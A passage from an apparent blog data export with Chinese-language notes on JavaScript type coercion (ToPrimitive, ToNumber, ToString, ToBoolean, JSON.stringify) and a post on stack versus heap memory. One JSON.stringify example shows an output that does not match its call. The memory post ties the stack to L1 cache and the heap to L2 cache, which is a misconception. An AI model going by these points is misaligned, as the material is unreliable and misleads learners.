class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ValidatorClass</span> </span>&#123;</span><br><span class=\"line\">  get [<span class=\"built_in\">Symbol</span>.toStringTag]() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Validator&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"keyword\">new</span> ValidatorClass()); <span class=\"comment\">// &quot;[object Validator]&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-3-ToPrimitive-抽象操作\"><a href=\"#2-3-ToPrimitive-抽象操作\" class=\"headerlink\" title=\"2.3 ToPrimitive 抽象操作\"></a>2.3 ToPrimitive 抽象操作</h5><p><code>ToPrimitive(input, PreferredType)</code> 是JavaScript引擎内部的抽象操作，原理如下：<br>可选参数 <code>PreferredType</code> 可以是 <code>Number</code> 或者 <code>String</code>，它只代表了一个转换的偏好，转换结果不一定必须是这个参数所指的类型，但转换结果一定是一个原始值。</p>\n<p><code>PreferredType</code> 被标志为 <code>Number</code> 时：</p>\n<ol>\n<li>如果输入的值已经是个原始值，则直接返回它</li>\n<li>如果输入的值是一个对象，则调用该对象的 <code>valueOf()</code> 方法，如果 <code>valueOf()</code> 方法的返回值是一个原始值，则返回这个原始值</li>\n<li>否则，调用这个对象的 <code>toString() </code>方法，如果 <code>toString()</code> 方法的返回值是一个原始值，则返回这个原始值</li>\n<li>否则，抛出 TypeError 异常</li>\n</ol>\n<p><code>PreferredType</code> 被标志为 <code>String</code> 时转换规则类似，不同的是先调用 <code>toString()</code> 方法，再调用 <code>valueOf() </code>方法</p>\n<blockquote>\n<p>如果没有 PreferredType 参数，则 PreferredType 的值会按照这样的规则来自动设置：Date 类型的对象会被设置为 String，其它类型的值会被设置为 Number（先调用 valueOf）</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">   valueOf () &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;valueOf&#x27;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> &#123;&#125;;</span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">   toString () &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;toString&#x27;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> &#123;&#125;;</span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(obj);</span><br><span class=\"line\"><span class=\"comment\">// valueOf</span></span><br><span class=\"line\"><span class=\"comment\">// toString</span></span><br><span class=\"line\"><span class=\"comment\">// TypeError: Cannot convert object to primitive value</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">String</span>(obj);</span><br><span class=\"line\"><span class=\"comment\">// toString</span></span><br><span class=\"line\"><span class=\"comment\">// valueOf</span></span><br><span class=\"line\"><span class=\"comment\">// TypeError: Cannot convert object to primitive value</span></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>valueOf()</th>\n<th>toString()</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Boolean</td>\n<td>true 或 false</td>\n<td>‘true’或者 ‘false’</td>\n</tr>\n<tr>\n<td>Number</td>\n<td>数值</td>\n<td>数值的字符串形式</td>\n</tr>\n<tr>\n<td>String</td>\n<td>返回该对象表示的字符串值</td>\n<td>返回该对象表示的字符串值</td>\n</tr>\n<tr>\n<td>Object</td>\n<td>返回该对象</td>\n<td>‘[object Object]’</td>\n</tr>\n<tr>\n<td>Array</td>\n<td>返回该数组</td>\n<td>以,分割的字符串，类似Array.join(‘,’)</td>\n</tr>\n<tr>\n<td>Date</td>\n<td>返回日期的毫秒数</td>\n<td>返回带有时区信息的日期和时间</td>\n</tr>\n<tr>\n<td>RegExp</td>\n<td>返回该正则函数</td>\n<td>返回正则表达式字面量</td>\n</tr>\n<tr>\n<td>Function</td>\n<td>返回该函数</td>\n<td>将函数代码以字符串形式返回</td>\n</tr>\n</tbody></table>\n<h3 id=\"3-类型转换\"><a href=\"#3-类型转换\" class=\"headerlink\" title=\"3 类型转换\"></a>3 类型转换</h3><h5 id=\"3-1-ToNumber\"><a href=\"#3-1-ToNumber\" class=\"headerlink\" title=\"3.1 ToNumber\"></a>3.1 ToNumber</h5><p>number 转换规则：</p>\n<ul>\n<li><code>true</code> 转换为 <code>1</code></li>\n<li><code>false</code> 转换为 <code>0</code> ，</li>\n<li><code>undefined</code> 转换为 <code>NaN</code> </li>\n<li><code>null</code> 转换为 <code>0</code></li>\n<li>字符串转为数字</li>\n</ul>\n<p>为了将值转换为相应的基本类型值，抽象操作 <code>ToPrimitive</code> 会首先检查该值是否有 <code>valueOf()</code> 方法，如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 <code>toString()</code> 的返回值（如果存在）来进行强制类型转换，否则会产生 <code>TypeError</code> 错误。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = &#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">valueOf</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;42&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = &#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">toString</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;42&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> c = [<span class=\"number\">4</span>, <span class=\"number\">2</span>];</span><br><span class=\"line\">c.toString = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.join(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Number</span>(a); <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(b); <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(c); <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(<span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>([]); <span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>([<span class=\"string\">&quot;abc&quot;</span>]); <span class=\"comment\">// NaN</span></span><br></pre></td></tr></table></figure>\n\n\n<h5 id=\"3-2-ToString\"><a href=\"#3-2-ToString\" class=\"headerlink\" title=\"3.2 ToString\"></a>3.2 ToString</h5><p>字符串化规则： </p>\n<ul>\n<li><code>null</code> 转换为 <code>&quot;null&quot;</code></li>\n<li><code>undefined</code> 转换为 <code>&quot;undefined&quot;</code></li>\n<li><code>true</code> 转换为 <code>&quot;true&quot;</code>，</li>\n<li>数字转换为普通字符串（较大或较小数值使用指数形式）</li>\n<li>普通对象使用 <code>toString()</code> （ <code>Object.prototype.toString()</code> ）返回内部属性 <code>[[Class]]</code> 的值，如 <code>&quot;[object Object]&quot;</code>。</li>\n</ul>\n<blockquote>\n<p>如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值<br>数组的默认 toString() 方法经过了重新定义，将所有单元字符串化以后再用 “,” 连接</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> num = <span class=\"string\">&#x27;123456789&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> n = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> u = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; <span class=\"attr\">name</span>: <span class=\"string\">&#x27;xxb&#x27;</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj2 = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">&#x27;xxb&#x27;</span>,</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">toString</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name + <span class=\"string\">&#x27;-------&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> error = <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;123&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">num.toString(); <span class=\"comment\">// 123456789</span></span><br><span class=\"line\">flag.toString(); <span class=\"comment\">// true</span></span><br><span class=\"line\">n + <span class=\"string\">&#x27;&#x27;</span>; <span class=\"comment\">// null</span></span><br><span class=\"line\">u + <span class=\"string\">&#x27;&#x27;</span>; <span class=\"comment\">// undefined</span></span><br><span class=\"line\">obj.toString(); <span class=\"comment\">// [object Object]</span></span><br><span class=\"line\">obj2.toString(); <span class=\"comment\">// xxb-------</span></span><br><span class=\"line\">arr.toString(); <span class=\"comment\">// 1,2,3</span></span><br><span class=\"line\">error.toString(); <span class=\"comment\">// Error: 123</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-3-ToBoolean\"><a href=\"#3-3-ToBoolean\" class=\"headerlink\" title=\"3.3 ToBoolean\"></a>3.3 ToBoolean</h5><p><code>undefined</code>、<code>null</code>、<code>false</code>、<code>+0</code> 、<code> -0</code> 和 <code>NaN</code>、<code>&quot;&quot;</code> 将转换为 <code>false</code>，其他值转换为 <code>true</code></p>\n<blockquote>\n<p>所有的对象都会转换为 true，包括{}、new Boolean(false)、new Number(0)、new String(‘’)</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!! <span class=\"literal\">null</span> <span class=\"comment\">// false</span></span><br><span class=\"line\">!! <span class=\"string\">&#x27;&#x27;</span> <span class=\"comment\">// false</span></span><br><span class=\"line\">!!<span class=\"literal\">NaN</span> <span class=\"comment\">// false</span></span><br><span class=\"line\">!!<span class=\"keyword\">new</span> <span class=\"built_in\">Boolean</span>(<span class=\"literal\">false</span>) <span class=\"comment\">// true</span></span><br><span class=\"line\">!!<span class=\"keyword\">new</span> <span class=\"built_in\">Number</span>(<span class=\"number\">0</span>); <span class=\"comment\">// true</span></span><br><span class=\"line\">!!<span class=\"keyword\">new</span> <span class=\"built_in\">String</span>(<span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">// true</span></span><br><span class=\"line\">!! <span class=\"string\">&quot;false&quot;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\">!! <span class=\"string\">&quot;0&quot;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\">!! <span class=\"string\">&quot;&#x27;&#x27;&quot;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\">!!&#123;&#125;; <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<p>字符串和数字之间的转换是通过 String(..) 和 Number(..) 这两个内建函数（原生构造函数，参见第 3 章）来实现的，请注意它们前面没有 new 关键字，并不创建封装对象。<br>~ 和 indexOf() 一起可以将结果强制类型转换（实际上仅仅是转换）为真 / 假值<br>~ 比 &gt;= 0 和 == -1 更简洁</p>\n<h5 id=\"3-4-JSON-字符串化\"><a href=\"#3-4-JSON-字符串化\" class=\"headerlink\" title=\"3.4 JSON 字符串化\"></a>3.4 JSON 字符串化</h5><ol>\n<li>字符串、数字、布尔值和 <code>null</code> 的 <code>JSON.stringify()</code> 规则与 <code>ToString</code> 基本相同。</li>\n<li>如果传递给 <code>JSON.stringify()</code> 的对象中定义了 <code>toJSON()</code> 方法，那么该方法会在字符串化前调用，以便将对象转换为安全的 JSON 值。</li>\n</ol>\n<p>所有安全的 JSON 值都可以使用 <code>JSON.stringify()</code> 字符串化。</p>\n<blockquote>\n<p>不安全的 JSON 值指 undefined 、 function 、 symbol和包含循环引用的对象，JSON.stringify() 在对象中遇到 undefined 、 function 和 symbol 时会自动将其忽略，在数组中则会返回 null （以保证单元位置不变）</p>\n</blockquote>\n<p>如果对象中定义了 toJSON() 方法，JSON 字符串化时会首先调用该方法，然后用它的返回值来进行序列化。如果要对含有非法 JSON 值的对象做字符串化，或者对象中的某些值无法被序列化时，就需要定义 toJSON() 方法来返回一个安全的 JSON 值。</p>\n<blockquote>\n<p>toJSON() 返回的应该是一个适当的值，可以是任何类型，然后再由 JSON.stringify() 对其进行字符串化</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(<span class=\"literal\">undefined</span>); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify([<span class=\"number\">1</span>, <span class=\"literal\">undefined</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;, <span class=\"number\">4</span>]); <span class=\"comment\">// &quot;[1,null,null,4]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(&#123; <span class=\"attr\">a</span>:<span class=\"number\">2</span>, <span class=\"attr\">b</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;&#125;); <span class=\"comment\">// &quot;&#123;&quot;a&quot;:2&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">   name: <span class=\"string\">&#x27;xxb&#x27;</span>,</span><br><span class=\"line\">   age: <span class=\"number\">24</span>,</span><br><span class=\"line\">   toJSON () &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(<span class=\"literal\">undefined</span>); <span class=\"comment\">// &quot;xxb&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-隐式转换\"><a href=\"#4-隐式转换\" class=\"headerlink\" title=\"4 隐式转换\"></a>4 隐式转换</h3><h5 id=\"4-1-隐式强制转换为-String\"><a href=\"#4-1-隐式强制转换为-String\" class=\"headerlink\" title=\"4.1 隐式强制转换为 String\"></a>4.1 隐式强制转换为 String</h5><p><code>+</code> 运算符即能用于数字加法，也能用于字符串拼接， <code>+</code> 运算符也能是一元运算符，将后面的操作数转换为数字</p>\n<p>ES5 规范定义：如果某个操作数是字符串或者能够通过以下步骤转换为字符串的话，+ 将进行拼接操作。如果其中一个操作数是对象（包括数组），则首先对其调用 <code>ToPrimitive</code> 抽象操作，该抽象操作再调用 <code>[[DefaultValue]]</code> ，以数字作为上下文。</p>\n<blockquote>\n<p>其中一个操作数是字符串（或者通过 <code>ToPrimitive</code> 得到字符串），则执行字符串拼接，否则执行数字加法</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = &#123;</span><br><span class=\"line\">  valueOf: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">42</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  toString: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">4</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">a + <span class=\"string\">&quot;&quot;</span>; <span class=\"comment\">// &quot;42&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">String</span>(a); <span class=\"comment\">// &quot;4&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// a + &quot;&quot; 会对 a 调用 valueOf() 方法，然后通过 ToString 抽象操作将返回值转换为字符串。</span></span><br><span class=\"line\"><span class=\"comment\">// String(a) 则是直接调用 ToString()</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>] + [<span class=\"number\">3</span>, <span class=\"number\">4</span>] <span class=\"comment\">// &#x27;1,23,4&#x27;</span></span><br><span class=\"line\"><span class=\"number\">42</span> + <span class=\"string\">&#x27;&#x27;</span> <span class=\"comment\">// &#x27;42&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">[] + &#123;&#125; <span class=\"comment\">// &#x27;[object Object]&#x27;</span></span><br><span class=\"line\">&#123; &#125; +[] <span class=\"comment\">// 0 `&#123;&#125;` 被当做代码块</span></span><br><span class=\"line\"></span><br><span class=\"line\">  + <span class=\"string\">&#x27;42&#x27;</span> <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"string\">&#x27;42&#x27;</span> - <span class=\"number\">0</span> <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"string\">&#x27;42&#x27;</span> - <span class=\"string\">&#x27;12&#x27;</span> <span class=\"comment\">// 32</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">32</span>] - [<span class=\"number\">21</span>] <span class=\"comment\">// 11</span></span><br><span class=\"line\">  [<span class=\"number\">32</span>] - [<span class=\"number\">2</span>, <span class=\"number\">1</span>] <span class=\"comment\">// NaN</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"隐式强制转换为-Number\"><a href=\"#隐式强制转换为-Number\" class=\"headerlink\" title=\"隐式强制转换为 Number\"></a>隐式强制转换为 Number</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// boolean 转换为 number</span></span><br><span class=\"line\"><span class=\"comment\">// 也可使用 Number(boolean) 进行隐式转换</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">booleanToNum</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">arguments</span>.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">arguments</span>[i]) &#123;</span><br><span class=\"line\">      sum += <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">booleanToNum(<span class=\"literal\">true</span>, <span class=\"literal\">false</span>, <span class=\"literal\">true</span>)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"隐式强制转换为Boolean\"><a href=\"#隐式强制转换为Boolean\" class=\"headerlink\" title=\"隐式强制转换为Boolean\"></a>隐式强制转换为Boolean</h5><p>下面的情况会发生隐式强制类型 Boolean 转换：</p>\n<ol>\n<li>if (..) 语句中的条件判断表达式。</li>\n<li>for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。</li>\n<li>while (..) 和 do..while(..) 循环中的条件判断表达式。</li>\n<li>? :中的条件判断表达式。</li>\n<li>逻辑运算符 || （逻辑或）和 &amp;&amp; （逻辑与）左边的操作数（作为条件判断表达式）。</li>\n</ol>\n<pre><code class=\"js\">var a = 42;\nvar b = &quot;abc&quot;;\nvar c;\nvar d = null;\nif (a) &#123;\n  console.log(&quot;yep&quot;); // yep\n&#125;\nwhile (c) &#123;\n  console.log(&quot;nope, never runs&quot;);\n&#125;\nc = d ? a : b;\nc; // &quot;abc&quot;\nif ((a &amp;&amp; d) || c) &#123;\n  console.log(&quot;yep&quot;); // yep\n&#125;```\n</code></pre>\n"},{"title":"栈内存与堆内存","date":"2021-01-27T04:24:48.000Z","_content":"\n# 栈内存与堆内存\n\n### 1、栈内存\n\n概念：存放基本类型的变量和对象的引用，比如 `boolean`、`string`、`number` 等，分配在栈内存区。\n\n特点：\n* 存取速度较快\n* 数据可以共享\n* 生命周期固定，缺乏灵活性\n\n### 2、堆内存\n\n概念：存放复杂数据类型（引用类型），比如 `Object`、 `Array` 等，系统不知道需要多大空间，需程序自己申请，分配在堆内存区。\n\n特点：\n* 存取速度较慢\n* 存放大量数据，每份数据的地址都不一样（通过 `new` 方式创建）\n\n### 3、为什么区分栈内存和堆内存？\n\n通常与垃圾回收机制有关，为了使程序运行时占用的内存最小。\n\n当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的；\n\n当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），\n这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见），\n\n则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。\n\n![栈内存、堆内存](https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1525441275251&di=22dc34589ed420f3b6733993269f18f8&imgtype=0&src=http%3A%2F%2Fimg.1oc.cn%2F2018%2F01%2F25%2F2014093009031910.png)\n\n> 栈使用的是一级缓存， 通常都是被调用时处于存储空间中，调用完毕立即释放\n> 堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定，调用的速度要相对来得低一些\n\n### 4、调用栈\n概念：函数中的 **调用栈（call stack）** 指由 **栈帧￼（stack frame）** 或叫 **活动记录（activation record）**构成的**栈**\n\n函数调用的局部状态中的数据存活时间满足 “后入先出”（LIFO）顺序，与算法中的栈结构有相同的机制，所以叫做调用栈。\n\n对于同步调用的函数，其调用逻辑是递归的，被调用者的局部信息所占空间的分配总是后于调用者的（后入），而其释放则总是先于调用者的（先出），所以使用栈结构是最简捷的一种方式（不一定必须用栈）\n\n```\nmain()  a()  b()  c()\n   -                         main()\n   |\n   +>     -                    a()\n   .      |\n   .      +>   -                 b()\n   .      .    |\n   .      .    +>   -              c()\n   .      .    .    |\n   .      .    +   <-              return from c()\n   .      .    |\n   .      +   <-                 return from b()\n   .      |\n   +     <-                    return from a()\n   |\n   -                         return from main()\n```\n\n**算法中的栈、堆、队列**\n栈：一种后进先出的的数据结构\n队列：一种先进先出的的数据结构\n堆：可以被看成是一棵树，如：堆排序\n\n","source":"_posts/JavaScript/栈内存与堆内存.md","raw":"---\ntitle: 栈内存与堆内存\ncategories: JavaScript\ntags: [JavaScript 原理]\ndate: 2021-01-27 12:24:48\n---\n\n# 栈内存与堆内存\n\n### 1、栈内存\n\n概念：存放基本类型的变量和对象的引用，比如 `boolean`、`string`、`number` 等，分配在栈内存区。\n\n特点：\n* 存取速度较快\n* 数据可以共享\n* 生命周期固定，缺乏灵活性\n\n### 2、堆内存\n\n概念：存放复杂数据类型（引用类型），比如 `Object`、 `Array` 等，系统不知道需要多大空间，需程序自己申请，分配在堆内存区。\n\n特点：\n* 存取速度较慢\n* 存放大量数据，每份数据的地址都不一样（通过 `new` 方式创建）\n\n### 3、为什么区分栈内存和堆内存？\n\n通常与垃圾回收机制有关，为了使程序运行时占用的内存最小。\n\n当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的；\n\n当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），\n这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见），\n\n则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。\n\n![栈内存、堆内存](https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1525441275251&di=22dc34589ed420f3b6733993269f18f8&imgtype=0&src=http%3A%2F%2Fimg.1oc.cn%2F2018%2F01%2F25%2F2014093009031910.png)\n\n> 栈使用的是一级缓存， 通常都是被调用时处于存储空间中，调用完毕立即释放\n> 堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定，调用的速度要相对来得低一些\n\n### 4、调用栈\n概念：函数中的 **调用栈（call stack）** 指由 **栈帧￼（stack frame）** 或叫 **活动记录（activation record）**构成的**栈**\n\n函数调用的局部状态中的数据存活时间满足 